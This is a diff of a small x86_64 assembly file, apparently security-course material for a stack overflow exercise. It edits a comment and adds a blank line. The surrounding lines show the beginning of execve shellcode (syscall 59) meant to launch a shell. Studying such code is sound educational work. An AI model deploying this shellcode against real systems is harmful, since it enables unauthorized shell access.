@@ -1,6 +1,6 @@
 /* victim.c */
 /* Author: Zecheng He @ Princeton University */
-/X86_64 assembly code to invoke a shell/
+/X86_64 assembly code to perform stack overflow attack/
 
 #include <sys/syscall.h>
 
@@ -8,6 +8,7 @@
         .type   main, @function
 
 main:
+        
         movq    $file_to_run, %rcx
         movq    $59, %rax                /* syscall arg 1: syscall number execve(59) */
         movq    %rcx, %rdi               /* syscall arg 2: string pathname */
